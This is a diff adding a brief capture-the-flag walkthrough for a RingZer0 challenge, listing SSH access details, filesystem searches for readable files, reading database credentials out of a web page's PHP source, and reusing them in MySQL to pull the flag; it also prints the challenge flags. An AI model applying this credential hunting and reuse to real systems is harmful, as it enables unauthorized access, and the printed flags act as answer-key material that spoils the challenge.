@@ -1,0 +1,20 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/152
+# Objective: Dig for flag.
+
+ssh architect@challenges.ringzer0team.com -p 10152
+pass: FLAG-232f99b4178bdc7fef7eb1f0f78831f9
+
+1. ssh into server
+2. grep -r "architect" / 2>/dev/null
+
+3. find / -readable -and -user architect 2>/dev/null
+3. find / -type f -readable ! -empty '(' -user architect -o -group architect ')' 2>&-
+
+4. cat /var/www/index.php
+5. copy db credentials "arch:asdftgTst5sdf6309sdsdff9lsdftz"
+6. mysql -u arch -pasdftgTst5sdf6309sdsdff9lsdftz
+7. use arch;
+8. select * from flag;
+
+FLAG-55548fdb24a6ef248d8fdfde2720f6bd
